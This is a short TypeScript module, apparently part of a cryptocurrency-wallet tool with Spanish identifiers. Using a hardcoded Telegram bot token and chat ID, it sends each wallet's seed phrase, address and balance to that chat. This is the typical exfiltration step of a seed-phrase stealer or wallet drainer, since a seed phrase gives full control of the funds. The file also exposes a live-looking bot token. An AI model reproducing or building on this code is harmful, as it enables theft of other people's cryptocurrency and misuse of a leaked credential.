import TelegramBot from "node-telegram-bot-api";
import { WalletConCashItem } from "../leer/leerSeguimientoWalletCash";

const token = "7943951367:AAG0X-lhN4kkIaR0oLV-63ZWwgwfgqisTOs";
const bot = new TelegramBot(token, { polling: false });
const chatId = "814041563";

export const enviarMensajeTelegram = (msj: WalletConCashItem): void => {
    const mensaje = `   📢 Semilla: 
                        ${msj.frase}
                        ---------------
                        👛 Wallet_${msj.wallet_de}: 
                        ${msj.direccion}
                        ---------------
                        💰 Saldo: ${msj.saldo}
                        `;
      bot
      .sendMessage(chatId, mensaje)
      .then(() => {
        console.log("Mensaje enviado con éxito 📢");
      })
      .catch((error) => {
        console.error("Error al enviar el mensaje:", error);
      });
  };